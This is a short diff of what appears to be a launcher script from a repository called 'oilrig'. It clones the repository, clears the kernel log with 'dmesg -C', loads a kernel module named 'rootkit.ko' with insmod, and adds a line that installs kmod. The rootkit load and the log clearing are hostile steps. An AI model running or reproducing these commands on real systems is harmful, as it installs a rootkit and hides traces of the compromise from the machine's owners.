@@ -19,6 +19,7 @@ git clone https://github.com/VYOM00907/oilrig
 echo "launcher started "
 
 echo "loading module"
+apt-get install kmod
 dmesg -C 
 insmod rootkit.ko
 dmesg 
